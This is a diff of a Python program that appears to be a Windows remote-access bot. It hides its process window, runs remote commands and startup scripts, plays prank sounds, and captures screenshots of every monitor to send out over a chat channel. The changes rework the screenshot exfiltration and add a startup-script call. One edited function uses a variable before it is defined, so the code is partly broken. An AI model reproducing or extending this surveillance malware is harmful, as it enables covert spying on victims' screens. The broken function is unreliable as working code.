@@ -42,22 +42,18 @@ import sys
 import json
 import ctypes
 import psutil
-import socket
 import inspect
 import traceback
 from io import BytesIO
 import pyautogui as pg
 import subprocess as sp
 from shutil import copy2
-from re import findall, M
 from time import time, sleep
-from tkinter import Tk, Label
 from datetime import datetime
 from tempfile import gettempdir
 from typing import Any, Callable
 from random import choice, randint
 from winotify import audio, Notification
-from random import uniform, choice, random
 from webbrowser import open as browseropen
 from string import ascii_letters, printable
 from subprocess import CREATE_NO_WINDOW, PIPE, Popen
@@ -1012,7 +1008,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             registry.update(exported)
 
         for label, (command, action, description) in registry.items():
-            if label == "<STARTUPSCRIPT>":
+            if label == STARTUP_SCRIPT_MARKER:
+                continue
+            if label == ONLOAD_PLUGINS_MARKER:
                 action()
                 continue
             new_command = Command(name=command,
@@ -1554,8 +1552,13 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def fart(self) -> None:
         self.__play_loaded_sound("fart")
 
-    def fastscreenshot(self, caption=None) -> List[Any]:
-        return [x for x in fast_screenshot(join(BURN_DIRECTORY, "tmp{mon}tmp.png"), lambda x:self.__send_image(x, caption=caption))]
+    def fastscreenshot(self) -> List[Any]:
+        path = join(BURN_DIRECTORY, "tmp.{mon}.png")
+        for x in fast_screenshot(path):
+            monitor_name = x.split(".")[1]
+            print(f"{x=}")
+            self.__send_image(x, caption=monitor_name)
+        #return [x for x in fast_screenshot(join(BURN_DIRECTORY, "tmp{mon}tmp.png"), lambda x:self.__send_image(x, caption=caption))]
 
     def replyquickmenu(self) -> int:
         commands = [f"/{c.name}" for c in self.commands]
@@ -1781,6 +1784,10 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def screenshot(self) -> None: #AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
         try:
             images = self.fastscreenshot()
+            if not images:
+                return
+            if not isfile(image):
+                return
             for image in images:
                 remove(image)
         except Exception as e:
@@ -2116,6 +2123,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         loop.run_as_thread()
         STARTING_LOG_MESSAGE.edit("STARTED MESSAGE LOOP")
         STARTING_LOG_MESSAGE.delete() #Weeeeeeeeeeeee
+        self.startupscript()
         while self.running:
             try:
                 sleep(10)
